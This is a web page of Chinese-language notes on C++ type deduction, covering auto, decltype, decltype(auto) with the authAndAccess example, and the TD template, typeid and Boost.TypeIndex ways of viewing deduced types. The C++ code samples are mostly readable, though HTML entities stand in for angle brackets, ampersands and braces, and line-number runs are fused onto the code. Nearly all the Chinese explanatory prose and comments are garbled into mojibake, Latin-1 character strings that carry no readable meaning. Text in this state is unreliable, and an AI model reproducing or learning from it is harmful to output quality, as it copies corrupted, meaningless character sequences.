//æ¦‚å¿µåŒ–çš„æ¨¡æ¿ç”¨æ¥æ¨å¯¼cxçš„ç±»å‹void func_for_cx(const T param);func_for_cx(x); //æ¦‚å¿µåŒ–è°ƒç”¨ï¼š //paramçš„æ¨å¯¼ç±»å‹æ˜¯cxçš„ç±»å‹template&lt;typename T&gt; //æ¦‚å¿µåŒ–çš„æ¨¡æ¿ç”¨æ¥æ¨å¯¼rxçš„ç±»å‹void func_for_rx(const T &amp; param);func_for_rx(x); //æ¦‚å¿µåŒ–è°ƒç”¨ï¼š //paramçš„æ¨å¯¼ç±»å‹æ˜¯rxçš„ç±»å‹ åœ¨ä½¿ç”¨autoä½œä¸ºç±»å‹è¯´æ˜ç¬¦çš„å˜é‡å£°æ˜ä¸­ï¼Œç±»å‹è¯´æ˜ç¬¦ä»£æ›¿äº†ParamTypeï¼š 123auto x = 27; //ç±»å‹è¯´æ˜ç¬¦æ—¢ä¸æ˜¯æŒ‡é’ˆä¹Ÿä¸æ˜¯å¼•ç”¨const auto cx = x; //ç±»å‹è¯´æ˜ç¬¦æ—¢ä¸æ˜¯æŒ‡é’ˆä¹Ÿä¸æ˜¯å¼•ç”¨const auto &amp; rx=cx; //ç±»å‹è¯´æ˜ç¬¦æ˜¯ä¸€ä¸ªæŒ‡é’ˆæˆ–å¼•ç”¨ä½†ä¸æ˜¯é€šç”¨å¼•ç”¨ 123456auto&amp;&amp; uref1 = x; //xæ˜¯intå·¦å€¼ï¼Œ //æ‰€ä»¥uref1ç±»å‹ä¸ºint&amp;auto&amp;&amp; uref2 = cx; //cxæ˜¯const intå·¦å€¼ï¼Œ //æ‰€ä»¥uref2ç±»å‹ä¸ºconst int&amp;auto&amp;&amp; uref3 = 27; //27æ˜¯intå³å€¼ï¼Œ //æ‰€ä»¥uref3ç±»å‹ä¸ºint&amp;&amp; 1234567891011const char name[] = //nameçš„ç±»å‹æ˜¯const char[13] \"R. N. Briggs\";auto arr1 = name; //arr1çš„ç±»å‹æ˜¯const char*auto&amp; arr2 = name; //arr2çš„ç±»å‹æ˜¯const char (&amp;)[13]void someFunc(int, double); //someFuncæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œ //ç±»å‹ä¸ºvoid(int, double)auto func1 = someFunc; //func1çš„ç±»å‹æ˜¯void (*)(int, double)auto&amp; func2 = someFunc; //func2çš„ç±»å‹æ˜¯void (&amp;)(int, double) autoç±»å‹æ¨å¯¼å’Œæ¨¡æ¿ç±»å‹æ¨å¯¼å‡ ä¹ä¸€æ ·çš„å·¥ä½œã€‚ å¦‚æœä½ æƒ³å£°æ˜ä¸€ä¸ªå¸¦æœ‰åˆå§‹å€¼27çš„intï¼ŒC++98æä¾›ä¸¤ç§è¯­æ³•é€‰æ‹©ï¼š 12int x1 = 27;int x2(27); C++11ç”±äºä¹Ÿæ·»åŠ äº†ç”¨äºæ”¯æŒç»Ÿä¸€åˆå§‹åŒ–ï¼ˆuniform initializationï¼‰çš„è¯­æ³•ï¼š 12int x3 = &#123; 27 &#125;;int x4&#123; 27 &#125;; æ€»ä¹‹ï¼Œè¿™å››ç§ä¸åŒçš„è¯­æ³•åªä¼šäº§ç”Ÿä¸€ä¸ªç›¸åŒçš„ç»“æœï¼šå˜é‡ç±»å‹ä¸ºintå€¼ä¸º27ã€‚ ä½¿ç”¨ auto è¿›è¡Œçš„ç±»å‹æ¨å¯¼ï¼Œå…¶ç»“æœå´ä¸ä¸€æ ·ï¼š 12345auto x1 = 27; //ç±»å‹æ˜¯intï¼Œå€¼æ˜¯27auto x2(27); //åŒä¸Šauto x3 = &#123; 27 &#125;; //ç±»å‹æ˜¯std::initializer_list&lt;int&gt;ï¼Œ //å€¼æ˜¯&#123; 27 &#125;auto x4&#123; 27 &#125;; //åŒä¸Š è¿™å°±é€ æˆäº†autoç±»å‹æ¨å¯¼ä¸åŒäºæ¨¡æ¿ç±»å‹æ¨å¯¼çš„ç‰¹æ®Šæƒ…å†µã€‚å½“ç”¨autoå£°æ˜çš„å˜é‡ä½¿ç”¨èŠ±æ‹¬å·è¿›è¡Œåˆå§‹åŒ–ï¼Œautoç±»å‹æ¨å¯¼æ¨å‡ºçš„ç±»å‹åˆ™ä¸ºstd::initializer_listã€‚å¦‚æœè¿™æ ·çš„ä¸€ä¸ªç±»å‹ä¸èƒ½è¢«æˆåŠŸæ¨å¯¼ï¼ˆæ¯”å¦‚èŠ±æ‹¬å·é‡Œé¢åŒ…å«çš„æ˜¯ä¸åŒç±»å‹çš„å˜é‡ï¼‰ï¼Œç¼–è¯‘å™¨ä¼šæ‹’ç»è¿™æ ·çš„ä»£ç ï¼š 1auto x5 = &#123; 1, 2, 3.0 &#125;; //é”™è¯¯ï¼æ— æ³•æ¨å¯¼std::initializer_list&lt;T&gt;ä¸­çš„T å¯¹äºèŠ±æ‹¬å·çš„å¤„ç†æ˜¯autoç±»å‹æ¨å¯¼å’Œæ¨¡æ¿ç±»å‹æ¨å¯¼å”¯ä¸€ä¸åŒçš„åœ°æ–¹ã€‚ ç„¶è€Œå¦‚æœåœ¨æ¨¡æ¿ä¸­æŒ‡å®šTæ˜¯std::initializer_list&lt;T&gt;è€Œç•™ä¸‹æœªçŸ¥Tï¼Œæ¨¡æ¿ç±»å‹æ¨å¯¼å°±èƒ½æ­£å¸¸å·¥ä½œï¼š 12345template&lt;typename T&gt;void f(std::initializer_list&lt;T&gt; initList);f(&#123; 11, 23, 9 &#125;); //Tè¢«æ¨å¯¼ä¸ºintï¼ŒinitListçš„ç±»å‹ä¸º //std::initializer_list&lt;int&gt; åœ¨C++11ç¼–ç¨‹ä¸­ä¸€ä¸ªå…¸å‹çš„é”™è¯¯å°±æ˜¯å¶ç„¶ä½¿ç”¨äº†std::initializer_list&lt;T&gt;ç±»å‹çš„å˜é‡ã€‚ ä½†æ˜¯å¯¹äºC++14æ•…äº‹è¿˜åœ¨ç»§ç»­ï¼ŒC++14å…è®¸autoç”¨äºå‡½æ•°è¿”å›å€¼å¹¶ä¼šè¢«æ¨å¯¼ã€‚ è€Œä¸”C++14çš„lambdaå‡½æ•°ä¹Ÿå…è®¸åœ¨å½¢å‚å£°æ˜ä¸­ä½¿ç”¨autoã€‚ä½†æ˜¯åœ¨è¿™äº›æƒ…å†µä¸‹autoå®é™…ä¸Šä½¿ç”¨æ¨¡æ¿ç±»å‹æ¨å¯¼çš„é‚£ä¸€å¥—è§„åˆ™åœ¨å·¥ä½œï¼Œè€Œä¸æ˜¯autoç±»å‹æ¨å¯¼ï¼Œæ‰€ä»¥è¯´ä¸‹é¢è¿™æ ·çš„ä»£ç ä¸ä¼šé€šè¿‡ç¼–è¯‘ï¼š 1234auto createInitList()&#123; return &#123; 1, 2, 3 &#125;; //é”™è¯¯ï¼ä¸èƒ½æ¨å¯¼&#123; 1, 2, 3 &#125;çš„ç±»å‹&#125; åŒæ ·åœ¨C++14çš„ lambda å‡½æ•°ä¸­è¿™æ ·ä½¿ç”¨autoä¹Ÿä¸èƒ½é€šè¿‡ç¼–è¯‘ï¼š 123456std::vector&lt;int&gt; v;auto resetV = [&amp;v](const auto&amp; newValue)&#123; v = newValue; &#125;; //C++14resetV(&#123; 1, 2, 3 &#125;); //é”™è¯¯ï¼ä¸èƒ½æ¨å¯¼&#123; 1, 2, 3 &#125;çš„ç±»å‹ ç»“è®º autoç±»å‹æ¨å¯¼é€šå¸¸å’Œæ¨¡æ¿ç±»å‹æ¨å¯¼ç›¸åŒï¼Œä½†æ˜¯autoç±»å‹æ¨å¯¼å‡å®šèŠ±æ‹¬å·åˆå§‹åŒ–ä»£è¡¨std::initializer_listï¼Œè€Œæ¨¡æ¿ç±»å‹æ¨å¯¼ä¸è¿™æ ·åš åœ¨C++14ä¸­autoå…è®¸å‡ºç°åœ¨å‡½æ•°è¿”å›å€¼æˆ–è€…lambdaå‡½æ•°å½¢å‚ä¸­ï¼Œä½†æ˜¯å®ƒçš„å·¥ä½œæœºåˆ¶æ˜¯æ¨¡æ¿ç±»å‹æ¨å¯¼é‚£ä¸€å¥—æ–¹æ¡ˆï¼Œè€Œä¸æ˜¯autoç±»å‹æ¨å¯¼ 3 decltype decltypeï¼Œç»™å®ƒä¸€ä¸ªåå­—æˆ–è€…è¡¨è¾¾å¼decltypeå°±ä¼šå‘Šè¯‰ä½ è¿™ä¸ªåå­—æˆ–è€…è¡¨è¾¾å¼çš„ç±»å‹ã€‚é€šå¸¸ï¼Œå®ƒä¼šç²¾ç¡®çš„å‘Šè¯‰ä½ ä½ æƒ³è¦çš„ç»“æœã€‚ decltypeåªæ˜¯ç®€å•çš„è¿”å›åå­—æˆ–è€…è¡¨è¾¾å¼çš„ç±»å‹ï¼š 123456789101112const int i = 0; //decltype(i)æ˜¯const intbool f(const Widget&amp; w); //decltype(w)æ˜¯const Widget&amp; //decltype(f)æ˜¯bool(const Widget&amp;)struct Point&#123; int x,y; //decltype(Point::x)æ˜¯int&#125;; //decltype(Point::y)æ˜¯intWidget w; //decltype(w)æ˜¯Widgetif (f(w))â€¦ //decltype(f(w))æ˜¯bool 1234567891011template&lt;typename T&gt; //std::vectorçš„ç®€åŒ–ç‰ˆæœ¬class vector&#123;public: â€¦ T&amp; operator[](std::size_t index); â€¦&#125;;vector&lt;int&gt; v; //decltype(v)æ˜¯vector&lt;int&gt;â€¦if (v[0] == 0)â€¦ //decltype(v[0])æ˜¯int&amp; åœ¨C++11ä¸­ï¼Œdecltypeæœ€ä¸»è¦çš„ç”¨é€”å°±æ˜¯ç”¨äºå£°æ˜å‡½æ•°æ¨¡æ¿ï¼Œè€Œè¿™ä¸ªå‡½æ•°è¿”å›ç±»å‹ä¾èµ–äºå½¢å‚ç±»å‹ã€‚ å¯¹ä¸€ä¸ªTç±»å‹çš„å®¹å™¨ä½¿ç”¨operator[] é€šå¸¸ä¼šè¿”å›ä¸€ä¸ªT&amp;å¯¹è±¡ï¼Œæ¯”å¦‚std::dequeå°±æ˜¯è¿™æ ·ã€‚ ä½†æ˜¯std::vectoræœ‰ä¸€ä¸ªä¾‹å¤–ï¼Œå¯¹äºstd::vector&lt;bool&gt;ï¼Œoperator[]ä¸ä¼šè¿”å›bool&amp;ï¼Œå®ƒä¼šè¿”å›ä¸€ä¸ªå…¨æ–°çš„å¯¹è±¡ï¼ˆMSVCçš„STLå®ç°ä¸­è¿”å›çš„æ˜¯std::_Vb_reference&lt;std::_Wrap_alloc&lt;std::allocator&lt;unsigned int&gt;&gt;&gt;å¯¹è±¡ï¼‰ã€‚ decltype è·å–è¿”å›å€¼ç±»å‹çš„ç¤ºä¾‹ ä½¿ç”¨decltypeè®¡ç®—è¿”å›ç±»å‹çš„ä¸€ä¸ªä¾‹å­æ˜¯ï¼š 1234567template&lt;typename Container, typename Index&gt; //å¯ä»¥å·¥ä½œï¼Œauto authAndAccess(Container&amp; c, Index i) //ä½†æ˜¯éœ€è¦æ”¹è‰¯ -&gt;decltype(c[i])&#123; authenticateUser(); return c[i];&#125; å‡½æ•°åç§°å‰é¢çš„autoä¸ä¼šåšä»»ä½•çš„ç±»å‹æ¨å¯¼å·¥ä½œã€‚ç›¸åçš„ï¼Œä»–åªæ˜¯æš—ç¤ºä½¿ç”¨äº†C++11çš„å°¾ç½®è¿”å›ç±»å‹è¯­æ³•ï¼Œå³åœ¨å‡½æ•°å½¢å‚åˆ—è¡¨åé¢ä½¿ç”¨ä¸€ä¸ªâ€-&gt;â€œç¬¦å·æŒ‡å‡ºå‡½æ•°çš„è¿”å›ç±»å‹ï¼Œå°¾ç½®è¿”å›ç±»å‹çš„å¥½å¤„æ˜¯æˆ‘ä»¬å¯ä»¥åœ¨å‡½æ•°è¿”å›ç±»å‹ä¸­ä½¿ç”¨å‡½æ•°å½¢å‚ç›¸å…³çš„ä¿¡æ¯ã€‚åœ¨authAndAccesså‡½æ•°ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨cå’ŒiæŒ‡å®šè¿”å›ç±»å‹ã€‚ åœ¨C++14æ ‡å‡†ä¸‹æˆ‘ä»¬å¯ä»¥å¿½ç•¥å°¾ç½®è¿”å›ç±»å‹ï¼Œåªç•™ä¸‹ä¸€ä¸ªautoã€‚ä½¿ç”¨è¿™ç§å£°æ˜å½¢å¼ï¼Œautoæ ‡ç¤ºè¿™é‡Œä¼šå‘ç”Ÿç±»å‹æ¨å¯¼ã€‚æ›´å‡†ç¡®çš„è¯´ï¼Œç¼–è¯‘å™¨å°†ä¼šä»å‡½æ•°å®ç°ä¸­æ¨å¯¼å‡ºå‡½æ•°çš„è¿”å›ç±»å‹ã€‚ 123456template&lt;typename Container, typename Index&gt; //C++14ç‰ˆæœ¬ï¼Œauto authAndAccess(Container&amp; c, Index i) //ä¸é‚£ä¹ˆæ­£ç¡®&#123; authenticateUser(); return c[i]; //ä»c[i]ä¸­æ¨å¯¼è¿”å›ç±»å‹&#125; ä»è¿”å›å¯¹è±¡è¿›è¡Œä¿®æ”¹ ä¸Šè¿°ä»£ç å‡ºç°çš„ä¸€ä¸ªé—®é¢˜æ˜¯ï¼š operator[]å¯¹äºå¤§å¤šæ•°Tç±»å‹çš„å®¹å™¨ä¼šè¿”å›ä¸€ä¸ªT&amp;ï¼Œä½†æ˜¯ æ¡æ¬¾1 è§£é‡Šäº†åœ¨æ¨¡æ¿ç±»å‹æ¨å¯¼æœŸé—´ï¼Œè¡¨è¾¾å¼çš„å¼•ç”¨æ€§ï¼ˆreference-nessï¼‰ä¼šè¢«å¿½ç•¥ã€‚åŸºäºè¿™æ ·çš„è§„åˆ™ï¼Œè€ƒè™‘å®ƒä¼šå¯¹ä¸‹é¢ç”¨æˆ·çš„ä»£ç æœ‰å“ªäº›å½±å“ï¼š 12345std::deque&lt;int&gt; d;â€¦authAndAccess(d, 5) = 10; //è®¤è¯ç”¨æˆ·ï¼Œè¿”å›d[5]ï¼Œ //ç„¶åæŠŠ10èµ‹å€¼ç»™å®ƒ //æ— æ³•é€šè¿‡ç¼–è¯‘å™¨ï¼ åœ¨è¿™é‡Œd[5]æœ¬è¯¥è¿”å›ä¸€ä¸ªint&amp;ï¼Œä½†æ˜¯æ¨¡æ¿ç±»å‹æ¨å¯¼ä¼šå‰¥å»å¼•ç”¨çš„éƒ¨åˆ†ï¼Œå› æ­¤äº§ç”Ÿäº†intè¿”å›ç±»å‹ã€‚å‡½æ•°è¿”å›çš„é‚£ä¸ªintæ˜¯ä¸€ä¸ªå³å€¼ï¼Œä¸Šé¢çš„ä»£ç å°è¯•æŠŠ10èµ‹å€¼ç»™å³å€¼intï¼ŒC++11ç¦æ­¢è¿™æ ·åšï¼Œæ‰€ä»¥ä»£ç æ— æ³•ç¼–è¯‘ã€‚ è¦æƒ³è®©authAndAccessåƒæˆ‘ä»¬æœŸå¾…çš„é‚£æ ·å·¥ä½œï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨decltypeç±»å‹æ¨å¯¼æ¥æ¨å¯¼å®ƒçš„è¿”å›å€¼ï¼Œå³æŒ‡å®šauthAndAccessåº”è¯¥è¿”å›ä¸€ä¸ªå’Œc[i]è¡¨è¾¾å¼ç±»å‹ä¸€æ ·çš„ç±»å‹ã€‚ å› æ­¤æˆ‘ä»¬å¯ä»¥è¿™æ ·å†™authAndAccessï¼š 1234567template&lt;typename Container, typename Index&gt; //C++14ç‰ˆæœ¬ï¼Œdecltype(auto) //å¯ä»¥å·¥ä½œï¼ŒauthAndAccess(Container&amp; c, Index i) //ä½†æ˜¯è¿˜éœ€è¦&#123; //æ”¹è‰¯ authenticateUser(); return c[i];&#125; ç°åœ¨authAndAccesså°†ä¼šçœŸæ­£çš„è¿”å›c[i]çš„ç±»å‹ã€‚ç°åœ¨äº‹æƒ…è§£å†³äº†ï¼Œä¸€èˆ¬æƒ…å†µä¸‹c[i]è¿”å›T&amp;ï¼ŒauthAndAccessä¹Ÿä¼šè¿”å›T&amp;ï¼Œç‰¹æ®Šæƒ…å†µä¸‹c[i]è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼ŒauthAndAccessä¹Ÿä¼šè¿”å›ä¸€ä¸ªå¯¹è±¡ã€‚ decltype(auto)çš„ä½¿ç”¨ä¸ä»…ä»…å±€é™äºå‡½æ•°è¿”å›ç±»å‹ï¼Œå½“ä½ æƒ³å¯¹åˆå§‹åŒ–è¡¨è¾¾å¼ä½¿ç”¨decltypeæ¨å¯¼çš„è§„åˆ™ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ï¼š 12345678Widget w;const Widget&amp; cw = w;auto myWidget1 = cw; //autoç±»å‹æ¨å¯¼ //myWidget1çš„ç±»å‹ä¸ºWidgetdecltype(auto) myWidget2 = cw; //decltypeç±»å‹æ¨å¯¼ //myWidget2çš„ç±»å‹æ˜¯const Widget&amp; å½¢å‚ä¼ é€’é—®é¢˜ authAndAccesså£°æ˜ï¼š 12template&lt;typename Container, typename Index&gt;decltype(auto) authAndAccess(Container&amp; c, Index i); å®¹å™¨é€šè¿‡ä¼ å¼•ç”¨çš„æ–¹å¼ä¼ é€’éå¸¸é‡å·¦å€¼å¼•ç”¨ï¼ˆlvalue-reference-to-non-constï¼‰ï¼Œå› ä¸ºè¿”å›ä¸€ä¸ªå¼•ç”¨å…è®¸ç”¨æˆ·å¯ä»¥ä¿®æ”¹å®¹å™¨ã€‚ ä½†æ˜¯è¿™æ„å‘³ç€åœ¨ä¸èƒ½ç»™è¿™ä¸ªå‡½æ•°ä¼ é€’å³å€¼å®¹å™¨ï¼Œå³å€¼ä¸èƒ½è¢«ç»‘å®šåˆ°å·¦å€¼å¼•ç”¨ä¸Šï¼Œé™¤éè¿™ä¸ªå·¦å€¼å¼•ç”¨æ˜¯ä¸€ä¸ªconstï¼ˆlvalue-references-to-constï¼‰ã€‚ ä¸€ä¸ªå³å€¼å®¹å™¨ï¼Œæ˜¯ä¸€ä¸ªä¸´æ—¶å¯¹è±¡ï¼Œé€šå¸¸ä¼šåœ¨authAndAccessè°ƒç”¨ç»“æŸè¢«é”€æ¯ï¼Œè¿™æ„å‘³ç€authAndAccessè¿”å›çš„å¼•ç”¨å°†ä¼šæˆä¸ºä¸€ä¸ªæ‚¬ç½®çš„ï¼ˆdangleï¼‰å¼•ç”¨ã€‚ ä¸ºäº†ä½¿authAndAccessçš„å¼•ç”¨å¯ä»¥ç»‘å®šå·¦å€¼å’Œå³å€¼ï¼Œå¯ä»¥ä½¿ç”¨é€šç”¨å¼•ç”¨ã€‚æ‰€ä»¥æˆ‘ä»¬è¿™æ ·å£°æ˜ï¼š 12template&lt;typename Containter, typename Index&gt; //ç°åœ¨cæ˜¯é€šç”¨å¼•ç”¨decltype(auto) authAndAccess(Container&amp;&amp; c, Index i); è¿™è¡Œä»£ç ä¸­è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼š åœ¨è¿™ä¸ªæ¨¡æ¿ä¸­ï¼Œæˆ‘ä»¬ä¸çŸ¥é“æˆ‘ä»¬æ“çºµçš„å®¹å™¨çš„ç±»å‹æ˜¯ä»€ä¹ˆï¼Œä¹Ÿå°±æ˜¯è¯´ä¸çŸ¥é“å®ƒä½¿ç”¨çš„ç´¢å¼•å¯¹è±¡ï¼ˆindex objectsï¼‰çš„ç±»å‹ã€‚ å¯¹ä¸€ä¸ªæœªçŸ¥ç±»å‹çš„å¯¹è±¡ä½¿ç”¨ä¼ å€¼é€šå¸¸ä¼šé€ æˆä¸å¿…è¦çš„æ‹·è´ï¼Œå¯¹ç¨‹åºçš„æ€§èƒ½æœ‰æå¤§çš„å½±å“ï¼Œè¿˜ä¼šé€ æˆå¯¹è±¡åˆ‡ç‰‡è¡Œä¸ºã€‚ ä½†æ˜¯åªé’ˆå¯¹ STL å®¹å™¨ï¼ˆæ¯”å¦‚std::stringï¼Œstd::vectorå’Œstd::dequeçš„operator[]ï¼‰ï¼Œè¿™æ ·å¤„ç†æ˜¯åˆç†çš„ã€‚ ä¸ºäº†ä¿æŒå‚æ•°æœ¬èº«çš„å·¦å³å€¼å±æ€§ï¼Œè¿˜éœ€è¦è¿›è¡Œ std::forwardï¼š 1234567template&lt;typename Container, typename Index&gt; //æœ€ç»ˆçš„C++14ç‰ˆæœ¬decltype(auto)authAndAccess(Container&amp;&amp; c, Index i)&#123; authenticateUser(); return std::forward&lt;Container&gt;(c)[i];&#125; C++11ç‰ˆæœ¬ï¼š 12345678template&lt;typename Container, typename Index&gt; //æœ€ç»ˆçš„C++11ç‰ˆæœ¬autoauthAndAccess(Container&amp;&amp; c, Index i)-&gt;decltype(std::forward&lt;Container&gt;(c)[i])&#123; authenticateUser(); return std::forward&lt;Container&gt;(c)[i];&#125; å°†decltypeåº”ç”¨äºå˜é‡åä¼šäº§ç”Ÿè¯¥å˜é‡åçš„å£°æ˜ç±»å‹ã€‚è™½ç„¶å˜é‡åéƒ½æ˜¯å·¦å€¼è¡¨è¾¾å¼ï¼Œä½†è¿™ä¸ä¼šå½±å“decltypeçš„è¡Œä¸ºã€‚ä½†æ˜¯å¯¹äºä¸€äº›è¡¨è¾¾å¼ï¼Œå…¶ç±»å‹æ¨å¯¼ç»“æœï¼Œå¯èƒ½å‡ºç°&amp;å¼•ç”¨ç±»å‹ï¼š 12345678910decltype(auto) f1() &#123; int x = 0; â€¦ return x; //decltype(xï¼‰æ˜¯intï¼Œæ‰€ä»¥f1è¿”å›int&#125;decltype(auto) f2() &#123; int x = 0; return (x); //decltype((x))æ˜¯int&amp;ï¼Œæ‰€ä»¥f2è¿”å›int&amp;&#125; å¯¹äºåå­—æ¥è¯´ï¼Œxæ˜¯ä¸€ä¸ªå·¦å€¼ï¼ŒC++11å®šä¹‰äº†è¡¨è¾¾å¼(x)ä¹Ÿæ˜¯ä¸€ä¸ªå·¦å€¼ã€‚decltype((x))æ˜¯int&amp;ã€‚ç”¨å°æ‹¬å·è¦†ç›–ä¸€ä¸ªåå­—å¯ä»¥æ”¹å˜decltypeå¯¹äºåå­—äº§ç”Ÿçš„ç»“æœã€‚ å› æ­¤ï¼Œå½“ä½¿ç”¨decltype(auto)çš„æ—¶å€™ä¸€å®šè¦åŠ å€çš„å°å¿ƒï¼Œåœ¨è¡¨è¾¾å¼ä¸­çœ‹èµ·æ¥æ— è¶³è½»é‡çš„ç»†èŠ‚å°†ä¼šå½±å“åˆ°decltype(auto)çš„æ¨å¯¼ç»“æœã€‚ ç»“è®º decltypeäº§ç”Ÿå˜é‡æˆ–è€…è¡¨è¾¾å¼çš„ç±»å‹ å¯¹äºTç±»å‹çš„ä¸æ˜¯å•çº¯çš„å˜é‡åçš„å·¦å€¼è¡¨è¾¾å¼ï¼Œdecltypeæ€»æ˜¯äº§å‡ºTçš„å¼•ç”¨å³T&amp; C++14æ”¯æŒdecltype(auto)ï¼Œæ¨å¯¼å‡ºç±»å‹ï¼Œä½†æ˜¯å®ƒä½¿ç”¨decltypeçš„è§„åˆ™è¿›è¡Œæ¨å¯¼ï¼Œè€Œä¸æ˜¯ auto 4 æŸ¥çœ‹ç±»å‹æ¨å¯¼ç»“æœ ä¸‰ç§æ–¹æ¡ˆï¼š IDEç¼–è¾‘å™¨è·å¾—ç±»å‹æ¨å¯¼çš„ç»“æœ åœ¨ç¼–è¯‘æœŸé—´è·å¾—ç»“æœ åœ¨è¿è¡Œæ—¶è·å¾—ç»“æœ IDE IDEä¹‹æ‰€ä»¥èƒ½æä¾›è¿™äº›ä¿¡æ¯æ˜¯å› ä¸ºä¸€ä¸ªC++ç¼–è¯‘å™¨ï¼ˆæˆ–è€…è‡³å°‘æ˜¯å‰ç«¯ä¸­çš„ä¸€ä¸ªéƒ¨åˆ†ï¼‰è¿è¡ŒäºIDEä¸­ã€‚å¦‚æœè¿™ä¸ªç¼–è¯‘å™¨å¯¹ä½ çš„ä»£ç ä¸èƒ½åšå‡ºæœ‰æ„ä¹‰çš„åˆ†ææˆ–è€…æ¨å¯¼ï¼Œå®ƒå°±ä¸ä¼šæ˜¾ç¤ºæ¨å¯¼çš„ç»“æœã€‚ ç¼–è¯‘ å¯ä»¥é¦–å…ˆå£°æ˜ä¸€ä¸ªç±»æ¨¡æ¿ä½†ä¸å®šä¹‰ã€‚å°±åƒè¿™æ ·ï¼š 12template&lt;typename T&gt; //åªå¯¹TDè¿›è¡Œå£°æ˜class TD; //TD == \"Type Displayer\" å°è¯•å®ä¾‹åŒ–è¿™ä¸ªç±»æ¨¡æ¿å°±ä¼šå¼•å‡ºä¸€ä¸ªé”™è¯¯æ¶ˆæ¯ï¼Œå› ä¸ºè¿™é‡Œæ²¡æœ‰ç”¨æ¥å®ä¾‹åŒ–çš„ç±»æ¨¡æ¿å®šä¹‰ã€‚ä¸ºäº†æŸ¥çœ‹xå’Œyçš„ç±»å‹ï¼Œåªéœ€è¦ä½¿ç”¨å®ƒä»¬çš„ç±»å‹å»å®ä¾‹åŒ–TDï¼š 12TD&lt;decltype(x)&gt; xType; //å¼•å‡ºåŒ…å«xå’ŒyTD&lt;decltype(y)&gt; yType; //çš„ç±»å‹çš„é”™è¯¯æ¶ˆæ¯ å‡ºç° undefined template TD&lt;xxx&gt;ã€‚ è¿è¡Œæ—¶ ä½¿ç”¨printfçš„æ–¹æ³•ä½¿ç±»å‹ä¿¡æ¯åªæœ‰åœ¨è¿è¡Œæ—¶æ‰ä¼šæ˜¾ç¤ºå‡ºæ¥ï¼ˆå°½ç®¡ä¸å»ºè®®ä½¿ç”¨printfï¼‰ã€‚ 12std::cout &lt;&lt; typeid(x).name() &lt;&lt; '\\n'; //æ˜¾ç¤ºxå’Œyçš„ç±»å‹std::cout &lt;&lt; typeid(y).name() &lt;&lt; '\\n'; è¿™ç§æ–¹æ³•å¯¹ä¸€ä¸ªå¯¹è±¡å¦‚xæˆ–yè°ƒç”¨typeidäº§ç”Ÿä¸€ä¸ªstd::type_infoçš„å¯¹è±¡ï¼Œç„¶åstd::type_infoé‡Œé¢çš„æˆå‘˜å‡½æ•°name()æ¥äº§ç”Ÿä¸€ä¸ªCé£æ ¼çš„å­—ç¬¦ä¸²ï¼ˆå³ä¸€ä¸ªconst char*ï¼‰è¡¨ç¤ºå˜é‡çš„åå­—ã€‚ è°ƒç”¨std::type_info::nameä¸ä¿è¯è¿”å›ä»»ä½•æœ‰æ„ä¹‰çš„ä¸œè¥¿ï¼Œä½†æ˜¯åº“çš„å®ç°è€…å°è¯•å°½é‡ä½¿å®ƒä»¬è¿”å›çš„ç»“æœæœ‰ç”¨ã€‚ ä¸¾ä¸ªä¾‹å­ï¼ŒGNUå’ŒClangç¯å¢ƒä¸‹xçš„ç±»å‹ä¼šæ˜¾ç¤ºä¸º\"i\"ï¼Œyä¼šæ˜¾ç¤ºä¸º\"PKi\"ã€‚\"i\"è¡¨ç¤º\"int\"ï¼Œ\"\"PK\"è¡¨ç¤º\"pointer to konst const\"ï¼ˆæŒ‡å‘å¸¸é‡çš„æŒ‡é’ˆï¼‰ã€‚ å¦‚æœä¼ é€’çš„æ˜¯ä¸€ä¸ªå¼•ç”¨ï¼Œé‚£ä¹ˆå¼•ç”¨éƒ¨åˆ†ï¼ˆreference-nessï¼‰å°†è¢«å¿½ç•¥ï¼Œå¦‚æœå¿½ç•¥åè¿˜å…·æœ‰constæˆ–è€…volatileï¼Œé‚£ä¹ˆå¸¸é‡æ€§constnessæˆ–è€…æ˜“å˜æ€§volatilenessä¹Ÿä¼šè¢«å¿½ç•¥ã€‚ std::type_info::nameçš„ç»“æœå¹¶ä¸æ€»æ˜¯å¯ä¿¡çš„ï¼Œå› ä¸ºstd::type_info::nameè§„èŒƒæ‰¹å‡†åƒä¼ å€¼å½¢å‚ä¸€æ ·æ¥å¯¹å¾…è¿™äº›ç±»å‹ã€‚Boost TypeIndexåº“ï¼ˆBoost.TypeIndexï¼‰æ˜¯æ›´å¥½çš„é€‰æ‹©ã€‚ ä¾‹å¦‚ï¼š 123456789101112131415161718#include &lt;boost/type_index.hpp&gt;template&lt;typename T&gt;void f(const T&amp; param)&#123; using std::cout; using boost::typeindex::type_id_with_cvr; //æ˜¾ç¤ºT cout &lt;&lt; \"T = \" &lt;&lt; type_id_with_cvr&lt;T&gt;().pretty_name() &lt;&lt; '\\n'; //æ˜¾ç¤ºparamç±»å‹ cout &lt;&lt; \"param = \" &lt;&lt; type_id_with_cvr&lt;decltype(param)&gt;().pretty_name() &lt;&lt; '\\n';&#125; boost::typeindex::type_id_with_cvrè·å–ä¸€ä¸ªç±»å‹å®å‚ï¼ˆæˆ‘ä»¬æƒ³è·å¾—ç›¸åº”ä¿¡æ¯çš„é‚£ä¸ªç±»å‹ï¼‰ï¼Œå®ƒä¸æ¶ˆé™¤å®å‚çš„constï¼Œvolatileå’Œå¼•ç”¨ä¿®é¥°ç¬¦ï¼ˆå› æ­¤æ¨¡æ¿åä¸­æœ‰â€œwith_cvrâ€ï¼‰ã€‚ç»“æœæ˜¯ä¸€ä¸ªboost::typeindex::type_indexå¯¹è±¡ï¼Œå®ƒçš„pretty_nameæˆå‘˜å‡½æ•°è¾“å‡ºä¸€ä¸ªstd::stringï¼ŒåŒ…å«æˆ‘ä»¬èƒ½çœ‹æ‡‚çš„ç±»å‹è¡¨ç¤ºã€‚ åŸºäºè¿™ä¸ªfçš„å®ç°ç‰ˆæœ¬ï¼Œå†æ¬¡è€ƒè™‘é‚£ä¸ªä½¿ç”¨typeidæ—¶è·å–paramç±»å‹ä¿¡æ¯å‡ºé”™çš„è°ƒç”¨ï¼š 123456std::vetor&lt;Widget&gt; createVec(); //å·¥å‚å‡½æ•°const auto vw = createVec(); //ä½¿ç”¨å·¥å‚å‡½æ•°è¿”å›å€¼åˆå§‹åŒ–vwif (!vw.empty())&#123; f(&amp;vw[0]); //è°ƒç”¨f â€¦&#125; 